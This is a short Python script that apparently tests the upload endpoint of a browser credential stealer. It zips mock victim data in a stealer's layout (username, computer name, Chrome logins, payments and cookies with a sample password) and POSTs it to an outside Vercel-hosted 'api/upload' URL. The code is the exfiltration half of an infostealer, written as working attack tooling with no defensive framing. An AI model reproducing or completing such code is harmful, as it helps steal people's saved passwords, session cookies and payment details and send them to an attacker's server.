import os
import json
import time
import urllib.request
import zipfile
import io

def test_upload():
    # Create a test zip file
    buffer = io.BytesIO()
    test_data = {
        'system_info': {
            'username': 'TestUser',
            'computer_name': 'TestPC',
            'os': 'Windows',
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        },
        'browsers': {
            'chrome': {
                'logins': [{'url': 'https://test.com', 'username': 'test', 'password': 'pass123'}],
                'payments': [],
                'cookies': []
            }
        }
    }
    
    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('test.json', json.dumps(test_data, indent=2))
    
    buffer.seek(0)
    payload = buffer.read()
    
    # Your Vercel URL
    url = "https://monsterchugger67.vercel.app/api/upload"
    
    print(f"Sending {len(payload)} bytes to {url}")
    req = urllib.request.Request(
        url,
        data=payload,
        headers={'Content-Type': 'application/zip'}
    )
    
    try:
        response = urllib.request.urlopen(req, timeout=10)
        print(f"Response: {response.status}")
        print(f"Body: {response.read().decode()}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    test_upload()
